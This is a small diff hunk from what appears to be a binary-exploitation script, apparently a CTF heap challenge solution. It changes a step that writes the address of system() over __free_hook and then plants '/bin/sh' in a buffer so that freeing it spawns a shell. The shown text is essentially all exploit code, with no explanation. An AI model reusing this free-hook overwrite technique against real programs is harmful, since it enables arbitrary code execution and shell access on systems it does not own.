@@ -93,7 +93,7 @@ def pwn():
     edit(io, 13, b"A"*8, b"c"*0x38+p64(_free_hook-0x8))
     add(io, 16, 0x80)
     add(io, 17, 0x80)
-    edit(io, 17, p64(system_addr), p64(system_addr)*4)
+    edit(io, 17, b"50", p64(system_addr))
     # ddebug(io, "breakrva 0x16c4\ncontinue")
     edit(io, 11, b"a"*0x90+b"/bin/sh\x00", b"a"*0x80)
 
